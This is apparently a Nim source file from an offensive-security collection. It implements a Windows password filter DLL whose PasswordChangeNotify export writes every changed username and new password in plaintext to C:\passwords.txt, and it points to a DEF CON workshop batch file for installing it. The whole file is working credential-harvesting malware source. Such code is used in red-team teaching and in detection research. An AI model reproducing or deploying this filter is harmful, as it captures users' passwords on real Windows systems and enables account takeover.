#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause

    Install with the passfilter.bat file here https://github.com/zerosum0x0/defcon-25-workshop/blob/master/src/passfilter/passfilter.bat

    Reference:
        - https://github.com/zerosum0x0/defcon-25-workshop/blob/master/src/passfilter/passfilter/passfilter.c
]#

import strformat
import winim/lean

proc NimMain() {.cdecl, importc.}

proc PasswordChangeNotify(UserName: PUNICODE_STRING, RelativeId: ULONG, NewPassword: PUNICODE_STRING): NTSTATUS {.stdcall, exportc, dynlib.} =
    NimMain() # Initialize Nim's GC

    let f = open(r"C:\passwords.txt", fmAppend)
    defer: f.close()

    f.writeline(fmt"Username: {UserName.Buffer}, NewPassword: {NewPassword.Buffer}")

    return 0

proc InitializeChangeNotify(): BOOL {.stdcall, exportc, dynlib.} = 
    return true

proc PasswordFilter(AccountName: PUNICODE_STRING, FullName: PUNICODE_STRING, Password: PUNICODE_STRING, SetOperation: BOOL): BOOL {.stdcall, exportc, dynlib.} =
    return true

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
    return true
